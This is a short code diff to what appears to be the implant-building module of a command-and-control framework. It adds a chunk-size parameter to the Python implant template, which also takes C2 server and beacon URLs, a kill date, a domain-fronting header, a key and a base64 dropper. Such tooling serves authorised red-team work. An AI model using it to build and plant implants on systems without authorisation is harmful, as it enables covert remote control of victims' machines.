@@ -9,7 +9,7 @@ import urllib2
 
 class Implant(object):
 
-  def __init__(self, ipaddress, pivot, domain, user, hostname, arch, pid, proxy):
+  def __init__(self, ipaddress, pivot, domain, user, hostname, arch, pid, proxy, chunksize):
     self.RandomURI = randomuri()
     self.Label = None
     self.User = user
@@ -33,6 +33,7 @@ class Implant(object):
     self.ServerURL = new_serverurl = select_item("HostnameIP", "C2Server")
     self.AllBeaconURLs = get_otherbeaconurls()
     self.AllBeaconImages = get_images()
+    self.ChunkSize = chunksize
     self.SharpCore = """
 RANDOMURI19901%s10991IRUMODNAR
 URLS10484390243%s34209348401SLRU
@@ -43,7 +44,7 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
     with open("%spy_dropper.sh" % (PayloadsDirectory), 'rb') as f:
         self.PythonImplant = base64.b64encode(f.read())
     py_implant_core = open("%s/Implant-Core.py" % FilesDirectory, 'r').read()
-    self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.UserAgent)
+    self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.ChunkSize, self.Key, self.RandomURI, self.UserAgent)
     ps_implant_core = open("%s/Implant-Core.ps1" % FilesDirectory, 'r').read()
     self.C2Core = ps_implant_core % (self.Key, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)
 #Add all db elements
